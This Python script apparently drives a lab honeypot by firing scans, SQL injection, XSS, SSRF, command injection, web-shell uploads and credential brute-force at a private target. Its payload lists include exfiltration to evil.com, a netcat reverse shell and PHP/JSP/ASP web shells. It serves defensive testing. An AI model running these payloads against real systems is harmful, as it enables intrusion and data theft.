import os
import sys
# Allow running this script directly by ensuring project root is on sys.path
_PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

import socket
import time
import requests
import argparse
import random
from honeypot.config import HTTP_PORT, SSH_PORT, FTP_PORT, ALLOWED_ATTACK_TARGETS
from honeypot.utils.helpers import is_private_or_local

# Safety: require an explicit --target when not using default and check it's private/local
DEFAULT_TARGET = "127.0.0.1"

def check_target_safety(target):
    if target in ALLOWED_ATTACK_TARGETS:
        return True
    return is_private_or_local(target)

def simple_port_scan(target, ports=(21, 22, 80, 2121, 2222, 8080, 3306), timeout=0.8):
    results = {}
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((target, p))
            results[p] = "OPEN"
            s.close()
        except Exception:
            results[p] = "CLOSED"
    return results

def http_probe(target, port=HTTP_PORT):
    paths = ["/", "/admin", "/login", "/wp-admin", "/.env", "/robots.txt", 
             "/phpmyadmin", "/administrator", "/config.php", "/wp-config.php",
             "/backup", "/test", "/api", "/dashboard", "/panel", "/uploads",
             "/files", "/download", "/images", "/css", "/js", "/scripts",
             "/includes", "/lib", "/libraries", "/vendor", "/node_modules",
             "/assets", "/media", "/content", "/data", "/database", "/db",
             "/logs", "/log", "/tmp", "/temp", "/cache", "/var", "/etc",
             "/home", "/root", "/usr", "/bin", "/sbin", "/opt", "/srv",
             "/www", "/html", "/public", "/private", "/secure", "/secret",
             "/hidden", "/internal", "/system", "/admin.php", "/adminer.php",
             "/management", "/manager", "/control", "/console", "/terminal",
             "/shell", "/cmd", "/exec", "/eval", "/run", "/execute"]
    results = []
    for i in range(200):  # Increased from original small set
        p = random.choice(paths)
        url = f"http://{target}:{port}{p}"
        try:
            r = requests.get(url, timeout=3)
            results.append((url, r.status_code, len(r.content)))
        except Exception as e:
            results.append((url, "ERR", str(e)))
        time.sleep(0.1)
    return results

def sql_injection_probe(target, port=HTTP_PORT):
    """Simulate SQL injection attempts"""
    payloads = [
        "' OR '1'='1", "1' UNION SELECT * FROM users--", "'; DROP TABLE users;--",
        "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--", "admin'/*",
        "' OR 1=1--", "' OR 'x'='x", "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "' AND 1=1--", "' AND 1=2--", "' OR 1=1#", "' OR 'a'='a", "admin'--",
        "' UNION ALL SELECT 1,2,3,4,5--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
        "' OR BENCHMARK(1000000,MD5(1))--", "' UNION SELECT @@version--",
        "' UNION SELECT USER()--", "' UNION SELECT DATABASE()--", "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
        "' UNION SELECT username,password FROM users--", "' UNION SELECT * FROM information_schema.tables--",
        "' OR (SELECT COUNT(*) FROM sysobjects)>0--", "'; INSERT INTO users VALUES('hacker','password')--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,user(),version()--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
    ]
    results = []
    paths = ["/login", "/search", "/user", "/profile", "/account", "/products", "/category",
             "/news", "/blog", "/comment", "/contact", "/feedback", "/support", "/help"]
    
    for i in range(150):  # Significantly increased
        path = random.choice(paths)
        payload = random.choice(payloads)
        url = f"http://{target}:{port}{path}"
        data = {"username": payload, "password": "test", "id": payload, "search": payload}
        try:
            r = requests.post(url, data=data, timeout=3)
            results.append((f"POST {path}", payload, r.status_code))
        except Exception as e:
            results.append((f"POST {path}", payload, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def xss_probe(target, port=HTTP_PORT):
    """Simulate XSS attempts"""
    payloads = [
        "<script>alert('XSS')</script>", "javascript:alert('XSS')", "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>", "';alert('XSS');//", "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>", "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>", "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>", "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>", "<marquee onstart=alert('XSS')>",
        "\"><script>alert('XSS')</script>", "';alert(String.fromCharCode(88,83,83))//",
        "<script>prompt('XSS')</script>", "<script>confirm('XSS')</script>",
        "<script>eval('ale'+'rt(\"XSS\")')</script>", "<script>setTimeout('alert(\"XSS\")',1)</script>",
        "<script>setInterval('alert(\"XSS\")',1000)</script>", "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<div onmouseover=\"alert('XSS')\">test</div>", "<span onclick=\"alert('XSS')\">click</span>",
        "<a href=\"javascript:alert('XSS')\">link</a>", "<form><button formaction=javascript:alert('XSS')>",
        "<object data=\"javascript:alert('XSS')\">", "<embed src=\"javascript:alert('XSS')\">",
        "<link rel=stylesheet href=\"javascript:alert('XSS')\">", "<style>@import'javascript:alert(\"XSS\")';</style>"
    ]
    results = []
    paths = ["/search", "/comment", "/feedback", "/guestbook", "/forum", "/chat", "/message",
             "/post", "/submit", "/contact", "/support", "/review", "/rating", "/poll"]
    
    for i in range(120):  # Significantly increased
        path = random.choice(paths)
        payload = random.choice(payloads)
        url = f"http://{target}:{port}{path}?q={payload}&search={payload}&comment={payload}"
        try:
            r = requests.get(url, timeout=3)
            results.append((f"GET {path}", payload, r.status_code))
        except Exception as e:
            results.append((f"GET {path}", payload, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def ssrf_probe(target, port=HTTP_PORT):
    """Simulate SSRF attempts against /fetch endpoint"""
    urls = [
        "http://127.0.0.1:80/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd", "gopher://127.0.0.1:6379/_FLUSHALL", "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/", "http://127.0.0.1:5432/", "http://127.0.0.1:1433/",
        "http://127.0.0.1:6379/", "http://127.0.0.1:27017/", "http://127.0.0.1:9200/",
        "http://localhost:8080/", "http://localhost:8000/", "http://localhost:3000/",
        "http://169.254.169.254/latest/user-data/", "http://169.254.169.254/",
        "file:///etc/shadow", "file:///etc/hosts", "file:///etc/resolv.conf",
        "file:///proc/version", "file:///proc/cpuinfo", "file:///proc/meminfo",
        "dict://127.0.0.1:11211/", "ldap://127.0.0.1:389/", "sftp://127.0.0.1:22/",
        "ftp://127.0.0.1:21/", "tftp://127.0.0.1:69/", "smb://127.0.0.1:445/"
    ]
    results = []
    for i in range(80):  # Significantly increased
        u = random.choice(urls)
        try:
            r = requests.get(f"http://{target}:{port}/fetch", params={"url": u}, timeout=3)
            results.append((u, r.status_code))
        except Exception as e:
            results.append((u, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def open_redirect_probe(target, port=HTTP_PORT):
    """Simulate open redirect attempts against /redirect"""
    next_urls = [
        "http://evil.example.com/", "https://phish.tld/login", "//attacker.tld/path",
        "http://malicious.com/steal", "https://fake-bank.com/", "//evil.tld/",
        "http://127.0.0.1/admin", "https://localhost/secret", "//internal.local/",
        "javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>",
        "file:///etc/passwd", "ftp://attacker.com/", "gopher://evil.com:70/",
        "http://169.254.169.254/", "https://metadata.google.internal/",
        "http://attacker.com:8080/", "https://evil.org/phish", "//bad.domain.com/"
    ]
    results = []
    for i in range(60):  # Significantly increased
        n = random.choice(next_urls)
        try:
            r = requests.get(f"http://{target}:{port}/redirect", params={"next": n}, allow_redirects=False, timeout=3)
            results.append((n, r.status_code, r.headers.get("Location")))
        except Exception as e:
            results.append((n, f"ERR: {str(e)}", None))
        time.sleep(0.1)
    return results

def command_injection_probe(target, port=HTTP_PORT):
    """Simulate OS command injection attempts sent to generic endpoints"""
    payloads = [
        "test; id", "name=foo && cat /etc/passwd", "| nc 127.0.0.1 1234 -e /bin/sh",
        "$(curl http://127.0.0.1/)", "`uname -a`", "; bash -c 'curl http://127.0.0.1'",
        "& whoami", "&& ls -la", "|| cat /etc/hosts", "; ps aux", "| cat /etc/passwd",
        "$(id)", "`whoami`", "${jndi:ldap://evil.com/}", "test`id`test",
        "; wget http://evil.com/shell.sh", "| curl -d @/etc/passwd http://evil.com/",
        "&& python -c 'import os; os.system(\"id\")'", "; perl -e 'system(\"whoami\")'",
        "| ruby -e 'system(\"uname -a\")'", "$(python -c 'import os; os.system(\"id\")')",
        "`php -r 'system(\"whoami\");'`", "; node -e 'require(\"child_process\").exec(\"id\")'",
        "& powershell -c Get-Process", "&& cmd /c dir", "|| type C:\\Windows\\System32\\drivers\\etc\\hosts"
    ]
    targets = ["/search", "/api/v1/items", "/login", "/contact", "/feedback", "/upload",
               "/admin", "/exec", "/system", "/cmd", "/shell", "/run", "/execute"]
    results = []
    for i in range(200):  # Significantly increased
        tpath = random.choice(targets)
        pld = random.choice(payloads)
        try:
            r = requests.post(f"http://{target}:{port}{tpath}", data={"q": pld, "username": pld, "password": "x", "cmd": pld}, timeout=3)
            results.append((tpath, pld[:30], r.status_code))
        except Exception as e:
            results.append((tpath, pld[:30], f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def upload_probe(target, port=HTTP_PORT):
    """Simulate file upload attempts to /upload"""
    malicious_files = [
        ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("backdoor.jsp", b"<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
        ("webshell.asp", b"<%eval request(\"cmd\")%>", "application/x-asp"),
        ("exploit.py", b"import os; os.system('id')", "text/x-python"),
        ("malware.exe", b"MZ" + b"\x00" * 100, "application/x-executable"),
        ("virus.bat", b"@echo off\necho Infected!", "application/x-bat"),
        ("trojan.sh", b"#!/bin/bash\ncat /etc/passwd", "application/x-sh"),
        ("ransomware.js", b"alert('Your files are encrypted!');", "application/javascript"),
        ("keylogger.vbs", b"WScript.Echo \"Logging keys...\"", "application/x-vbs"),
        ("rootkit.pl", b"#!/usr/bin/perl\nsystem('whoami');", "application/x-perl")
    ]
    results = []
    for i in range(50):  # Significantly increased
        filename, content, mimetype = random.choice(malicious_files)
        files = {"file": (filename, content, mimetype)}
        try:
            r = requests.post(f"http://{target}:{port}/upload", files=files, timeout=5)
            results.append((filename, r.status_code, len(r.content)))
        except Exception as e:
            results.append((filename, f"ERR: {str(e)}", 0))
        time.sleep(0.2)
    return results

def header_scanner_probe(target, port=HTTP_PORT):
    """Simulate suspicious scanner user-agents"""
    agents = [
        "sqlmap/1.5.2", "Nmap Scripting Engine", "Nikto/2.5.0", "masscan/1.0.5",
        "ZAP/2.10.0", "Burp Suite Professional", "w3af.org", "OpenVAS",
        "Acunetix Web Vulnerability Scanner", "Nessus", "Rapid7 Nexpose",
        "IBM Security AppScan", "Qualys WAS", "WhiteHat Sentinel",
        "Veracode", "Checkmarx", "SonarQube", "OWASP ZAP",
        "Metasploit", "Cobalt Strike", "BeEF", "SET (Social Engineering Toolkit)",
        "DirBuster", "Gobuster", "ffuf", "wfuzz", "Burp Intruder"
    ]
    results = []
    for i in range(80):  # Significantly increased
        ua = random.choice(agents)
        try:
            r = requests.get(f"http://{target}:{port}/", headers={"User-Agent": ua}, timeout=3)
            results.append((ua, r.status_code))
        except Exception as e:
            results.append((ua, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def brute_force_simulation(target, port=HTTP_PORT):
    """Simulate brute force login attempts"""
    usernames = ["admin", "root", "user", "test", "guest", "administrator", "sa", "oracle", "postgres", "mysql"]
    passwords = ["admin", "password", "123456", "root", "toor", "user", "test", "guest", "qwerty", "letmein"]
    
    results = []
    for i in range(150):  # Significantly increased
        username = random.choice(usernames)
        password = random.choice(passwords)
        url = f"http://{target}:{port}/login"
        data = {"username": username, "password": password}
        try:
            r = requests.post(url, data=data, timeout=3)
            results.append((username, password, r.status_code))
        except Exception as e:
            results.append((username, password, f"ERR: {str(e)}"))
        time.sleep(0.2)
    return results

def directory_traversal_probe(target, port=HTTP_PORT):
    """Simulate directory traversal attempts"""
    payloads = [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd", "....\/....\/....\/etc\/passwd",
        "../../../etc/shadow", "../../../etc/hosts", "../../../etc/resolv.conf",
        "../../../proc/version", "../../../proc/cpuinfo", "../../../var/log/auth.log",
        "..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system.ini",
        "..\\..\\..\\windows\\boot.ini", "../../../usr/local/apache/conf/httpd.conf",
        "../../../etc/apache2/apache2.conf", "../../../var/www/html/index.php"
    ]
    results = []
    
    for i in range(100):  # Significantly increased
        payload = random.choice(payloads)
        url = f"http://{target}:{port}/file?path={payload}"
        try:
            r = requests.get(url, timeout=3)
            results.append((payload, r.status_code))
        except Exception as e:
            results.append((payload, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def ssh_simulate_text(target, port=SSH_PORT, attempts=20):  # Increased attempts
    results = []
    for _ in range(attempts):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            banner = s.recv(2048)
            # send plain-text lines to the fake ssh port (harmless)
            creds = [b"root:toor\n", b"admin:admin\n", b"user:password\n", b"test:test\n", b"guest:guest\n"]
            for c in creds:
                try:
                    s.sendall(c)
                    time.sleep(0.1)
                except Exception:
                    break
            s.close()
            results.append(("OK", banner.decode(errors="replace").strip()))
        except Exception as e:
            results.append(("ERR", str(e)))
        time.sleep(0.2)
    return results

def enhanced_ssh_brute_force(target, port=SSH_PORT):
    """Enhanced SSH brute force simulation with common credentials"""
    usernames = ["root", "admin", "user", "guest", "ubuntu", "pi", "postgres", "mysql", "oracle", "test"]
    passwords = ["root", "toor", "password", "123456", "admin", "", "user", "guest", "raspberry", "postgres"]
    
    results = []
    for i in range(200):  # Significantly increased
        username = random.choice(usernames)
        password = random.choice(passwords)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            banner = s.recv(1024)
            
            # Simulate SSH protocol negotiation attempts
            ssh_version = b"SSH-2.0-OpenSSH_8.0\r\n"
            s.sendall(ssh_version)
            
            # Send credential attempt as plain text (honeypot won't parse properly)
            cred_attempt = f"{username}:{password}\n".encode()
            s.sendall(cred_attempt)
            
            # Try to receive response
            try:
                response = s.recv(1024)
                results.append((username, password, "attempted", len(response)))
            except:
                results.append((username, password, "no_response", 0))
            
            s.close()
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.2)  # Faster attempts
    
    return results

def malware_simulation(target, port=HTTP_PORT):
    """Simulate malware-like HTTP requests"""
    malware_paths = [
        "/shell.php", "/c99.php", "/r57.php", "/webshell.php", "/cmd.php", "/backdoor.php",
        "/upload.php", "/file.php", "/eval.php", "/system.php", "/exec.php", "/passthru.php",
        "/wso.php", "/b374k.php", "/adminer.php", "/phpmyadmin.php", "/mysql.php",
        "/database.php", "/config.php", "/wp-config.php", "/configuration.php"
    ]
    malware_agents = [
        "Mozilla/5.0 (compatible; Baiduspider/2.0)", "python-requests/2.25.1", "curl/7.68.0",
        "Wget/1.20.3", "masscan/1.0.5", "nmap", "sqlmap", "nikto", "dirb", "gobuster"
    ]
    
    results = []
    for i in range(150):  # Significantly increased
        path = random.choice(malware_paths)
        agent = random.choice(malware_agents)
        url = f"http://{target}:{port}{path}"
        headers = {"User-Agent": agent}
        try:
            r = requests.get(url, headers=headers, timeout=3)
            results.append((path, agent, r.status_code))
        except Exception as e:
            results.append((path, agent, f"ERR: {str(e)}"))
        time.sleep(0.1)
    
    return results

def ftp_brute_force(target, port=FTP_PORT):
    """Simulate FTP brute force attacks"""
    usernames = ["anonymous", "ftp", "admin", "root", "user", "test", "guest", "administrator", "ftpuser"]
    passwords = ["", "user@domain.com", "ftp", "admin", "root", "user", "test", "guest", "password", "ftpuser"]
    
    results = []
    for i in range(120):  # Significantly increased
        username = random.choice(usernames)
        password = random.choice(passwords)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Receive banner
            banner = s.recv(1024)
            
            # Send USER command
            user_cmd = f"USER {username}\r\n"
            s.sendall(user_cmd.encode())
            response1 = s.recv(1024)
            
            # Send PASS command
            pass_cmd = f"PASS {password}\r\n"
            s.sendall(pass_cmd.encode())
            response2 = s.recv(1024)
            
            # Send QUIT to close connection cleanly
            s.sendall(b"QUIT\r\n")
            s.recv(1024)  # Receive goodbye message
            
            results.append((username, password, "attempted", response2.decode('utf-8', errors='replace').strip()))
            s.close()
            
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.2)  # Faster attempts
    
    return results

def main(target):
    if not check_target_safety(target):
        print("[!] Target appears public or unsafe. Aborting. Only localhost/private networks allowed.")
        return

    print("[*] Starting comprehensive attack simulation with 1000+ attacks...")
    print(f"[*] Target: {target}")
    print("=" * 60)

    # 1. Port scanning
    print("[*] Phase 1: Port scanning...")
    scan = simple_port_scan(target)
    for p,st in scan.items():
        print(f"  port {p}: {st}")
    print()

    # 2. Basic HTTP probes
    print("[*] Phase 2: HTTP directory enumeration (200 requests)...")
    for url, status, info in http_probe(target):
        print(f"  {url} -> {status}  ({info})")
    print()

    # 3. SQL Injection attempts
    print("[*] Phase 3: SQL Injection simulation (150 attempts)...")
    for method, payload, status in sql_injection_probe(target):
        print(f"  {method} -> Payload: {payload[:30]}... -> {status}")
    print()

    # 4. XSS attempts
    print("[*] Phase 4: XSS simulation (120 attempts)...")
    for method, payload, status in xss_probe(target):
        print(f"  {method} -> Payload: {payload[:30]}... -> {status}")
    print()

    # 5. Directory traversal
    print("[*] Phase 5: Directory traversal simulation (100 attempts)...")
    for payload, status in directory_traversal_probe(target):
        print(f"  Path: {payload[:40]}... -> {status}")
    print()

    # 6. SSRF attempts
    print("[*] Phase 6: SSRF simulation (80 attempts)...")
    for u, status in ssrf_probe(target):
        print(f"  fetch url={u[:40]}... -> {status}")
    print()

    # 7. HTTP brute force
    print("[*] Phase 7: HTTP brute force simulation (150 attempts)...")
    for username, password, status in brute_force_simulation(target):
        print(f"  Login attempt: {username}:{password} -> {status}")
    print()

    # 8. Malware-like requests
    print("[*] Phase 8: Malware simulation (150 requests)...")
    for path, agent, status in malware_simulation(target):
        print(f"  {path} with {agent[:20]}... -> {status}")
    print()

    # 9. Open redirect attempts
    print("[*] Phase 9: Open redirect simulation (60 attempts)...")
    for n, status, loc in open_redirect_probe(target):
        print(f"  next={n} -> {status} Location={loc}")
    print()

    # 10. Command injection attempts
    print("[*] Phase 10: Command injection simulation (200 attempts)...")
    for tpath, payload, status in command_injection_probe(target):
        print(f"  {tpath} payload={payload}... -> {status}")
    print()

    # 11. Upload attempts
    print("[*] Phase 11: File upload simulation (50 attempts)...")
    for fname, status, size in upload_probe(target):
        print(f"  upload {fname} -> {status} ({size} bytes)")
    print()

    # 12. Basic SSH interactions
    print("[*] Phase 12: SSH-like text interactions (20 attempts)...")
    for res in ssh_simulate_text(target):
        print("  ssh_sim:", res)
    print()

    # 13. Enhanced SSH brute force
    print("[*] Phase 13: Enhanced SSH brute force (200 attempts)...")
    for username, password, status, info in enhanced_ssh_brute_force(target):
        print(f"  SSH: {username}:{password} -> {status} ({info})")
    print()

    # 14. FTP brute force
    print("[*] Phase 14: FTP brute force simulation (120 attempts)...")
    for username, password, status, response in ftp_brute_force(target):
        print(f"  FTP: {username}:{password} -> {status}")
    print()

    # 15. Scanner detection
    print("[*] Phase 15: Scanner user-agent simulation (80 requests)...")
    for ua, status in header_scanner_probe(target):
        print(f"  Scanner: {ua[:30]}... -> {status}")
    print()

    print("=" * 60)
    total_attacks = 200 + 150 + 120 + 100 + 80 + 150 + 150 + 60 + 200 + 50 + 20 + 200 + 120 + 80
    print(f"[*] Simulation complete! Total attacks launched: {total_attacks}+")
    print("[*] Check honeypot logs for captured events.")
    print("[*] Run: python -m honeypot.services.analyzer")
    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Safe honeypot attack simulator (lab-only).")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET, help="Target hostname/IP (must be private/local).")
    args = parser.parse_args()
    main(args.target)
